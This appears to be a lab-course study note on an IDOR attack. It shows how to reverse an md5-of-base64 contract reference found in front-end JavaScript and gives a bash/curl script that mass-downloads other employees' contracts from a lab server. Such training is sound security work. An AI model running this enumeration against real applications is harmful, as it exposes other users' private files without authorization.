---
title: d-Bypass Encoded References
draft: false
tags:
  - idor
---
In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.

Let's say we can download a file called `Employment_contract.pdf`.

Download request looks as follows:

```burp
POST /download.php HTTP/1.1

contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Above hash type seems to be in an `md5` format.

We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5` hashes match the above value. If we find a match, then we can replicate it for other users and collect their files.

For example, let's try comparing `md5` hash of our `uid` and see if it matched:

```shell-session
jadu101@htb[/htb]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

Unfortunately, it doesn't match.


## Function Disclosure

Many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers.

For example, if the above hash is handled in the front-end, we can learn the function and replicate it.

If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Knowing the above's function, we can reverse engineer to get the same hash as such:

```shell-session
jadu101@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

## Mass Enumeration

Let us write a simple bash script to retrieve all employee contracts.

We can start by calculating the hash for each of the first ten employees using the same previous command while using `tr -d` to remove the trailing `-` characters, as follows:

```shell-session
jadu101@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

With that, we can run the script, and it should download all contracts for employees 1-10:

```shell-session
jadu101@htb[/htb]$ bash ./exploit.sh
jadu101@htb[/htb]$ ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```